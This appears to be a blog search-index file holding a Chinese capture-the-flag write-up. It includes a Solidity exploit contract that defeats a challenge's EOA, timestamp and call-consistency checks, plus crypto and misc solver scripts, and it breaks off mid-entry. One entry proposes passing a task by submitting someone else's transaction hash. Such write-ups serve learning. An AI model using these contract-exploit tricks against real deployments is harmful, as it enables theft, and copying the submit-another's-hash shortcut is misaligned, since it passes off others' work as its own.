<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2023/11/27/give_me_Goerlieth/"/>
      <url>/2023/11/27/give_me_Goerlieth/</url>
      
        <content type="html"><![CDATA[<h3 id="give-me-Goerlieth"><a href="#give-me-Goerlieth" class="headerlink" title="give_me_Goerlieth"></a>give_me_Goerlieth</h3><p>这个题目吗要求在Goerlieth测试连上进行，但我没有Goerlieth币啊，咋办，怎么做</p><p>考虑到题目上让交Transaction Hash在区块连浏览器上是公开的，只需要在区块链浏览器上交别人的就可以了</p><h3 id="SimpleConnect"><a href="#SimpleConnect" class="headerlink" title="SimpleConnect"></a>SimpleConnect</h3><p>去区块链浏览器搜地址</p><h3 id="DEATH-N2TE"><a href="#DEATH-N2TE" class="headerlink" title="DEATH-N2TE"></a>DEATH-N2TE</h3><p>提取视频中可疑的像素点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">import cv2</span><br><span class="line">import numpy as np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def extract_pixels(video_path, threshold, start_col, col_interval, output_image_path):</span><br><span class="line">    cap = cv2.VideoCapture(video_path)</span><br><span class="line"></span><br><span class="line">    frame_width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))</span><br><span class="line">    frame_height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))</span><br><span class="line">    frame_count = int(cap.get(cv2.CAP_PROP_FRAME_COUNT))</span><br><span class="line"></span><br><span class="line">    extracted_image = np.zeros((frame_height, min(frame_count, frame_width), 3), dtype=np.uint8)</span><br><span class="line"></span><br><span class="line">    current_col = start_col</span><br><span class="line">    for frame_idx in range(frame_count):</span><br><span class="line">        ret, frame = cap.read()</span><br><span class="line">        if not ret:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">        if current_col &lt; frame_width:</span><br><span class="line">            col_to_scan = frame[:, current_col, :]</span><br><span class="line">            white_pixels = np.all(col_to_scan &gt;= threshold, axis=-1)</span><br><span class="line">            extracted_image[white_pixels, frame_idx, :] = col_to_scan[white_pixels]</span><br><span class="line"></span><br><span class="line">        current_col += col_interval</span><br><span class="line">        if current_col &gt;= frame_width:</span><br><span class="line">            current_col = start_col  # Reset to start if we exceed the width</span><br><span class="line"></span><br><span class="line">    cap.release()</span><br><span class="line"></span><br><span class="line">    cv2.imwrite(output_image_path, extracted_image)</span><br><span class="line">    cv2.imshow(&#x27;Extracted Image&#x27;, extracted_image)</span><br><span class="line">    cv2.waitKey(0)</span><br><span class="line">    cv2.destroyAllWindows()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">video_path = &#x27;./kira.mp4&#x27;</span><br><span class="line">threshold = np.array([200, 200, 200])</span><br><span class="line">start_col = 5</span><br><span class="line">col_interval = 10</span><br><span class="line">output_image_path = &#x27;extracted_image.png&#x27;</span><br><span class="line"></span><br><span class="line">extract_pixels(video_path, threshold, start_col, col_interval, output_image_path)</span><br></pre></td></tr></table></figure><p>提取出来有些不清楚，可以放到文档里拉伸一下，得到flag</p><p><img src="/2023/11/27/give_me_Goerlieth/AAwangzhan\1\hexoblog\source\image\image-20231127173648620.png" alt="image-20231127173648620"></p><h3 id="stage"><a href="#stage" class="headerlink" title="stage"></a>stage</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.4;</span><br><span class="line"></span><br><span class="line">interface IReceiver &#123;</span><br><span class="line">    function getNumber() external view returns(uint256);</span><br><span class="line">&#125;</span><br><span class="line">contract stageGame&#123;</span><br><span class="line">    mapping (address =&gt; bool) private flag;</span><br><span class="line">    mapping (address =&gt; bool) public isStage1Completed;</span><br><span class="line"></span><br><span class="line">    function stage1() external &#123;</span><br><span class="line">        uint size;</span><br><span class="line">        address addr = msg.sender;</span><br><span class="line">        assembly &#123; size := extcodesize(addr) &#125;</span><br><span class="line">        require(size == 0,&quot;EOA must!&quot;);</span><br><span class="line">        isStage1Completed[msg.sender] = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function stage2(uint _guess) external &#123;</span><br><span class="line">        require(isStage1Completed[msg.sender],&quot;You should complete stage1 first!&quot;);</span><br><span class="line">        uint number = block.timestamp % 100 + 1;</span><br><span class="line">        require(number == _guess, &quot;Wrong number!&quot;);</span><br><span class="line">        _stage3();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _stage3() private &#123;</span><br><span class="line">        uint size;</span><br><span class="line">        address addr = msg.sender;</span><br><span class="line">        assembly &#123; size := extcodesize(addr) &#125;</span><br><span class="line">        require(size &gt; 0,&quot;Contract must!&quot;);</span><br><span class="line">        uint256 number1;</span><br><span class="line">        uint256 number2;</span><br><span class="line">        (bool success,bytes memory data1) = addr.staticcall(abi.encodeWithSignature(&quot;getNumber()&quot;));</span><br><span class="line">        require(success,&quot;First call failed!&quot;);</span><br><span class="line">        number1 = abi.decode(data1, (uint256));</span><br><span class="line"></span><br><span class="line">        (bool success2,bytes memory data2) = addr.call(abi.encodeWithSignature(&quot;getNumber()&quot;));</span><br><span class="line">        require(success2,&quot;Second call failed!&quot;);</span><br><span class="line">        number2 = abi.decode(data2, (uint256));</span><br><span class="line">        require(number1 != number2, &quot;Must return different Number!&quot;);</span><br><span class="line"></span><br><span class="line">        flag[tx.origin] = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function check(address addr) external view returns(bool)&#123;</span><br><span class="line">        return flag[addr];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>合约中总共有3关</p><p>第一关，size为0即可绕过</p><p>第二关，猜数，直接套他源码就行</p><p>uint number &#x3D; block.timestamp % 100 + 1;</p><p>第三关的话，他需要检查地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.4;</span><br><span class="line"></span><br><span class="line">interface IReceiver &#123;</span><br><span class="line">    function getNumber() external view returns(uint256);</span><br><span class="line">&#125;</span><br><span class="line">contract stageGame&#123;</span><br><span class="line">    mapping (address =&gt; bool) private flag;</span><br><span class="line">    mapping (address =&gt; bool) public isStage1Completed;</span><br><span class="line"></span><br><span class="line">    function stage1() external &#123;</span><br><span class="line">        uint size;</span><br><span class="line">        address addr = msg.sender;</span><br><span class="line">        assembly &#123; size := extcodesize(addr) &#125;</span><br><span class="line">        require(size == 0,&quot;EOA must!&quot;);</span><br><span class="line">        isStage1Completed[msg.sender] = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function stage2(uint _guess) external &#123;</span><br><span class="line">        require(isStage1Completed[msg.sender],&quot;You should complete stage1 first!&quot;);</span><br><span class="line">        uint number = block.timestamp % 100 + 1;</span><br><span class="line">        require(number == _guess, &quot;Wrong number!&quot;);</span><br><span class="line">        _stage3();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _stage3() private &#123;</span><br><span class="line">        uint size;</span><br><span class="line">        address addr = msg.sender;</span><br><span class="line">        assembly &#123; size := extcodesize(addr) &#125;</span><br><span class="line">        require(size &gt; 0,&quot;Contract must!&quot;);</span><br><span class="line">        uint256 number1;</span><br><span class="line">        uint256 number2;</span><br><span class="line">        (bool success,bytes memory data1) = addr.staticcall(abi.encodeWithSignature(&quot;getNumber()&quot;));</span><br><span class="line">        require(success,&quot;First call failed!&quot;);</span><br><span class="line">        number1 = abi.decode(data1, (uint256));</span><br><span class="line"></span><br><span class="line">        (bool success2,bytes memory data2) = addr.call(abi.encodeWithSignature(&quot;getNumber()&quot;));</span><br><span class="line">        require(success2,&quot;Second call failed!&quot;);</span><br><span class="line">        number2 = abi.decode(data2, (uint256));</span><br><span class="line">        require(number1 != number2, &quot;Must return different Number!&quot;);</span><br><span class="line"></span><br><span class="line">        flag[tx.origin] = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function check(address addr) external view returns(bool)&#123;</span><br><span class="line">        return flag[addr];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">// 假设stageGame合约的接口如下</span><br><span class="line">interface IStageGame &#123;</span><br><span class="line">    function stage1() external;</span><br><span class="line">    function stage2(uint256 number) external;</span><br><span class="line">    function check(address addr) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Exp &#123;</span><br><span class="line">    IStageGame public stageGame;</span><br><span class="line"></span><br><span class="line">    constructor(address _address) &#123;</span><br><span class="line">        stageGame = IStageGame(_address);</span><br><span class="line">        stageGame.stage1();      </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 尝试获取gas消耗量，如果消耗超过2000则返回0，否则返回1</span><br><span class="line">    function getNumber() external view returns (uint256) &#123;</span><br><span class="line">        uint256 gbef = 0;</span><br><span class="line">        uint256 gaft = 0;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            gbef := gas()</span><br><span class="line">            let x := sload(0x66666)</span><br><span class="line">            gaft := gas()</span><br><span class="line">        &#125;</span><br><span class="line">        uint256 gasc = gbef - gaft;</span><br><span class="line">        if (gasc &gt; 2000) &#123;</span><br><span class="line">            return uint256(0);</span><br><span class="line">        &#125;</span><br><span class="line">        return uint256(1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 尝试执行hack操作，成功则返回true，否则返回false</span><br><span class="line">    function hack(address addr) public returns (bool) &#123;</span><br><span class="line">        bool flag = false;</span><br><span class="line">        uint256 number = block.timestamp % 100 + 1;</span><br><span class="line">        stageGame.stage2(number);</span><br><span class="line">        flag = stageGame.check(addr);</span><br><span class="line">        return flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/11/27/give_me_Goerlieth/AAwangzhan\1\hexoblog\source\image\image-20231127184237308.png" alt="image-20231127184237308">、</p><p>之后就打通了，可以在账户详情查看私钥</p><h3 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h3><blockquote><p>5359437b48656c6c6f5f576f726c645f43727970746f5f6269626f6269626f7d… Hmm… Something goes wrong with my grettings bot.</p></blockquote><p>义眼盯真。16进制ascii转化得到flag</p><h3 id="proof-of-work"><a href="#proof-of-work" class="headerlink" title="proof_of_work"></a>proof_of_work</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import re</span><br><span class="line">import string</span><br><span class="line">from itertools import product</span><br><span class="line"></span><br><span class="line">def pass_POW():</span><br><span class="line">    rec = &#x27;sha256(XXXX+FCxk8M9svYwVMfGe) == 793edc396da13a7992b429e50e7d122c41debbd902419d26a0792b4008dba844&#x27;</span><br><span class="line">    table = string.ascii_letters + string.digits</span><br><span class="line">    suffix = re.findall(r&#x27;\(XXXX\+(.*?)\)&#x27;, rec)[0]</span><br><span class="line">    last_hash = re.findall(r&#x27;== (.*?)$&#x27;, rec)[0]</span><br><span class="line">    print(&quot;suffix: %s, last_hash: %s&quot; % (suffix, last_hash))</span><br><span class="line">    for i in product(table, repeat=4):</span><br><span class="line">        prefix = &#x27;&#x27;.join(i)</span><br><span class="line">        guess = prefix + suffix</span><br><span class="line">        if hashlib.sha256(guess.encode()).hexdigest() == last_hash:</span><br><span class="line">            print(&quot;prefix XXXX is %s&quot; % prefix)</span><br><span class="line">            return prefix</span><br><span class="line">    return None</span><br><span class="line"></span><br><span class="line">pass_POW()</span><br></pre></td></tr></table></figure><h3 id="SimpleRSA"><a href="#SimpleRSA" class="headerlink" title="SimpleRSA"></a>SimpleRSA</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">from Crypto.Util.number import * </span><br><span class="line">flag = b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span><br><span class="line">assert len(flag) == 35</span><br><span class="line">p,q = [getPrime(2048) for _ in &quot;__&quot;] </span><br><span class="line">n = p*q </span><br><span class="line">e = 65537 </span><br><span class="line">c = gmpy2.powmod(bytes_to_long(flag),e,n) </span><br><span class="line">print(p) </span><br><span class="line">print(c)</span><br><span class="line">#24724324630507415330944861660078769085865178656494256140070836181271808964994457686409910764936630391300708451701526900994412268365698217113884698394658886249353179639767806926527103624836198494439742123128823109527320850165486500517304731554371680236789357527395416607541627295126502440202040826686102479225702795427693781581584928770373613126894936500089282093366117940069743670997994742595407158340397268147325612840109162997306902492023078425623839297511182053658542877738887677835528624045235391227122453939459585542485427063193993069301141720316104612551340923656979591045138487394366671477460626997125944456537</span><br><span class="line">#510345661718450375632304764819724223824018609359964259503762283253350010161515190912152623604019093266967095847334388281390406831587663253164256543905694021952211220652820225527413861208452760215767828927039893435528572148282529198773772864255061213208279999011194952146362748485103032149806538140693537361755210176698895104708379400806511907719904867068865970241208806615061055047254026118016836750283966478103987375361826198930529462261013324904522014804502582865716441828895047550041401172127129749969507853355531197814919603963664646220505672302543085959372679395717892060245461464861507164276442140407308832537707450729432224150754603518526288767105682399190438680085925078051459448618725871249563011864525585870188123725554411655044152994826056900502298772802133526591794328224932405680583757307064395792317383571866619582974377344736930271554160701478385763426091091686496788999588340419226785217028504684542197970387916262126278955278523452903043316452825738030645100271595942652498852506660789605846309602343932245435421425673058238785509280366229754404949219663043627431437755087855502139890639468481922788973821783957766433857773771229298328019250652625289700950165414584983487319078090573179470893450632419467111117341472</span><br></pre></td></tr></table></figure><h3 id="OTPTwice"><a href="#OTPTwice" class="headerlink" title="OTPTwice"></a>OTPTwice</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">from pwn import xor </span><br><span class="line">from os import urandom </span><br><span class="line">flag = b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot; </span><br><span class="line"></span><br><span class="line"># step0: key generation &amp; distribution</span><br><span class="line">def s0(msg): </span><br><span class="line">    k1,k2 = [urandom(len(msg)) for _ in &quot;__&quot;] </span><br><span class="line">    return k1,k2 </span><br><span class="line"></span><br><span class="line">#  </span><br><span class="line"></span><br><span class="line"># step1: Alice encrypt M, and send it to Bob</span><br><span class="line">def s1(msg,k1):</span><br><span class="line">    c1 = xor(msg,k1)</span><br><span class="line">    return c1 </span><br><span class="line"></span><br><span class="line"># step2: Bob encrypt c1, and send it to Alice </span><br><span class="line">def s2(msg,k2):</span><br><span class="line">    c2 = xor(msg,k2) </span><br><span class="line">    return c2 </span><br><span class="line"></span><br><span class="line"># step3: Alice decrypt c2, and send it to Bob.</span><br><span class="line">def s3(msg,k1):</span><br><span class="line">    c3 = xor(msg,k1)</span><br><span class="line">    return c3 </span><br><span class="line"></span><br><span class="line"># step4: Bob decrypt c3, get M.</span><br><span class="line">def s4(msg,k2):</span><br><span class="line">    m_ = xor(msg,k2) </span><br><span class="line">    return m_ </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def encrypt(msg,k1,k2): </span><br><span class="line">    c1 = s1(msg,k1) </span><br><span class="line">    c2 = s2(c1,k2) </span><br><span class="line">    c3 = s3(c2,k1)</span><br><span class="line">    m_ = s4(c3,k2) </span><br><span class="line">    assert msg == m_</span><br><span class="line"></span><br><span class="line"># Here&#x27;s what hacker Eve got:</span><br><span class="line">def encrypt_(msg,k1,k2):</span><br><span class="line">    c1 = s1(msg,k1) </span><br><span class="line">    c2 = s2(c1,k2) </span><br><span class="line">    c3 = s3(c2,k1)</span><br><span class="line">    m_ = s4(c3,k2) </span><br><span class="line">    if HACK == True:</span><br><span class="line">        print(c1) </span><br><span class="line">        print(c2) </span><br><span class="line">        print(c3) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">k1,k2 = s0(flag) </span><br><span class="line">encrypt_(flag,k1,k2) </span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">b&#x27;\xdbi\xab\x8d\xfb0\xd3\xfe!\xf8Xpy\x80w\x8c\x87\xb9&#x27;</span><br><span class="line">b&#x27;o\xb0%\xfb\xdb\x0e\r\x04\xde\xd1\x9a\x08w\xda4\x0f\x0cR&#x27;</span><br><span class="line">b&#x27;\xe7\x80\xcd\ria\xb2\xca\x89\x1a\x9d;|#3\xf7\xbb\x96&#x27;</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">rom pwn import xor </span><br><span class="line"></span><br><span class="line">C1=b&#x27;\xdbi\xab\x8d\xfb0\xd3\xfe!\xf8Xpy\x80w\x8c\x87\xb9&#x27;</span><br><span class="line">C2=b&#x27;o\xb0%\xfb\xdb\x0e\r\x04\xde\xd1\x9a\x08w\xda4\x0f\x0cR&#x27;</span><br><span class="line">C3=b&#x27;\xe7\x80\xcd\ria\xb2\xca\x89\x1a\x9d;|#3\xf7\xbb\x96&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">K1=xor(C2,C3)</span><br><span class="line">K2=xor(C2,C1)</span><br><span class="line"></span><br><span class="line">flag=xor(K1,C1)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h3 id="OldAlgorithm"><a href="#OldAlgorithm" class="headerlink" title="OldAlgorithm"></a>OldAlgorithm</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import * </span><br><span class="line">import os </span><br><span class="line">flag = b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span><br><span class="line"></span><br><span class="line">pad = lambda msg,padlen: msg+os.urandom(padlen-len(msg))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = pad(flag,32)</span><br><span class="line">print(len(flag))</span><br><span class="line">p = [getPrime(16) for _ in range(32)] </span><br><span class="line">c = [bytes_to_long(flag)%i for i in p] </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(&#x27;p=&#x27;,p)</span><br><span class="line">print(&#x27;c=&#x27;,c)</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">p= [58657, 47093, 47963, 41213, 57653, 56923, 41809, 49639, 44417, 38639, 39857, 53609, 55621, 41729, 60497, 44647, 39703, 55117, 44111, 57131, 37747, 63419, 63703, 64007, 46349, 39241, 39313, 44909, 40763, 46727, 34057, 56333]</span><br><span class="line">c= [36086, 4005, 3350, 23179, 34246, 5145, 32490, 16348, 13001, 13628, 7742, 46317, 50824, 23718, 32995, 7640, 10590, 46897, 39245, 16633, 31488, 36547, 42136, 52782, 31929, 34747, 29026, 18748, 6634, 9700, 8126, 5197]</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line"></span><br><span class="line">def chinese_remainder_theorem(c, p):</span><br><span class="line">    # 计算模数的乘积</span><br><span class="line">    N = 1</span><br><span class="line">    for i in p:</span><br><span class="line">        N *= i</span><br><span class="line"></span><br><span class="line">    result = 0</span><br><span class="line">    for i in range(len(c)):</span><br><span class="line">        # 计算每个模数的乘积</span><br><span class="line">        Ni = N // p[i]</span><br><span class="line"></span><br><span class="line">        # 计算模反元素</span><br><span class="line">        Mi = pow(Ni, -1, p[i])</span><br><span class="line"></span><br><span class="line">        # 计算部分解密结果</span><br><span class="line">        result += c[i] * Ni * Mi</span><br><span class="line"></span><br><span class="line">    # 取最小正整数解</span><br><span class="line">    flag = result % N</span><br><span class="line"></span><br><span class="line">    return long_to_bytes(flag)</span><br><span class="line"></span><br><span class="line">p= [58657, 47093, 47963, 41213, 57653, 56923, 41809, 49639, 44417, 38639, 39857, 53609, 55621, 41729, 60497, 44647, 39703, 55117, 44111, 57131, 37747, 63419, 63703, 64007, 46349, 39241, 39313, 44909, 40763, 46727, 34057, 56333]</span><br><span class="line">c= [36086, 4005, 3350, 23179, 34246, 5145, 32490, 16348, 13001, 13628, 7742, 46317, 50824, 23718, 32995, 7640, 10590, 46897, 39245, 16633, 31488, 36547, 42136, 52782, 31929, 34747, 29026, 18748, 6634, 9700, 8126, 5197]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = chinese_remainder_theorem(c, p)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h3 id="easy-classic"><a href="#easy-classic" class="headerlink" title="easy_classic"></a>easy_classic</h3><p>套娃题，套麻了</p><p>第一层，凯撒16</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">udzeojxuwqcu</span><br><span class="line"></span><br><span class="line">enjoythegame</span><br></pre></td></tr></table></figure><p>第二层，w型栅栏密码 7</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ialhhooavtepcyr</span><br><span class="line"></span><br><span class="line">ilovecryptohaha</span><br></pre></td></tr></table></figure><p>第三层，bas64</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">5a6H5a6Z5LiH5rOV55qE6YKj5Liq5rqQ5aS0</span><br><span class="line"></span><br><span class="line">宇宙万法的那个源头</span><br></pre></td></tr></table></figure><p>第4层，熊曰解密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">熊曰：呋食食食取噗山笨笨破嗄咯哈動嗡雜類嗒嘿啽沒歡破吖咬我啽寶盜噔咯沒</span><br><span class="line"></span><br><span class="line">never gonna give you up</span><br></pre></td></tr></table></figure><p>第5层，先解emoji<a 